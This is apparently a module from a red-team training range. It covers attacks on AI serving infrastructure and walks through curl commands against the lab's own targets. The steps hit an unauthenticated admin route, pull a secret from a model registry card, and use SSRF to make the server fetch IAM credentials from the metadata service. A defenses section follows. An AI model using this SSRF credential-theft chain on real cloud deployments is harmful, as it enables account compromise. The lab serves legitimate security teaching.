# Module 09 — AI Infrastructure & Deployment Exploits

> **Targets:** `appserver` + `metadata` + `vault`. **Maps to:** AI-300 Module 9 ·
> OWASP LLM02 · OWASP Agentic ASI03 · MITRE ATLAS AML.T0040, AML.T0024.

## 1. Idea

Models run on ordinary — often over-privileged — infrastructure. A server-side
fetch primitive, an exposed inference port, or a leaky registry turns a model bug
into a cloud compromise. The `metadata` target stands in for the cloud instance
metadata service (169.254.169.254): reachable from inside the range, never from the
internet. `vault` is a second internal service. It does not appear in the recon
leak, and it does not accept the credential the easy SSRF returns. The range's
NetworkPolicies are part of the lesson — they are why SSRF to the *internet* fails
but SSRF to *internal* services succeeds.

## 2. Start

```bash
redsec up 09
APP=http://127.0.0.1:9090
```

## 3. Walkthrough

Work the tiers in order. The last one has no walkthrough.

### 3.1 `open-inference-api` — easy
```bash
curl -s $APP/ | grep -o '/v1/[a-z]*'      # routes are advertised
curl -s $APP/v1/admin                       # no auth -> flag
redsec submit 09 open-inference-api 'REDSEC{...}'
```

### 3.2 `registry-secrets` — medium
```bash
curl -s $APP/registry/models                        # ["initrode"]
curl -s $APP/registry/models/initrode/MLmodel        # secret in the model card
redsec submit 09 registry-secrets 'REDSEC{...}'
```

### 3.3 `metadata-ssrf` — hard (LLM02 / ASI03)
`POST /fetch` fetches any URL **server-side** with no allow-list. The catch: the
URL must be reachable *from the appserver*, not from your laptop — so first do
recon to discover the internal metadata address, then SSRF to it. (This is why
pointing at your own `127.0.0.1` wouldn't work against a real deployment: inside
the appserver that's the appserver itself.)

```bash
# 1) recon: the appserver leaks its internal endpoints
META=$(curl -s $APP/debug/config | python3 -c 'import sys,json;print(json.load(sys.stdin)["internal_endpoints"]["metadata"])')
echo "internal metadata service: $META"
# 2) SSRF: make the appserver fetch the IMDSv1 credentials for you
curl -s $APP/fetch -H 'content-type: application/json' \
  -d "{\"url\":\"$META/latest/meta-data/iam/security-credentials/role\"}"
redsec submit 09 metadata-ssrf 'REDSEC{...}'
```

### 3.4 `crown-jewel-chain` — impossible (sealed)

That credential does not open the second service. A token-bound role does, and the
fetcher now has an egress guard. `/debug/config` will not tell you where the crown
jewel is. No walkthrough — the answer is sealed in `solution/SEALED.md`, and
`redsec selftest 09` proves a solution exists.

```bash
redsec hint 09 crown-jewel-chain          # one north-star line, not a walkthrough
redsec down 09
```

## 4. Defenses

- **SSRF:** strict allow-lists for server-side fetches; block link-local/metadata
  ranges; require IMDSv2 with a hop limit of 1 so a stolen fetch cannot complete
  the token PUT. Isolate egress (as this range does).
- **Guards:** run header policy on the *parsed* header map. A denylist scanned
  against the raw body is not a parser.
- **Workload identity:** an internal service should refuse IMDSv1 credentials
  (the vault does). Don't then let the same fetcher attach the v2 token. Prefer
  mTLS or a platform identity the request body cannot set.
- **Inference APIs:** authenticate and rate-limit every route; never expose admin
  capabilities unauthenticated.
- **Registries:** scan model cards/configs/artifacts for secrets like code repos;
  use short-lived credentials and a secrets manager, never committed creds.
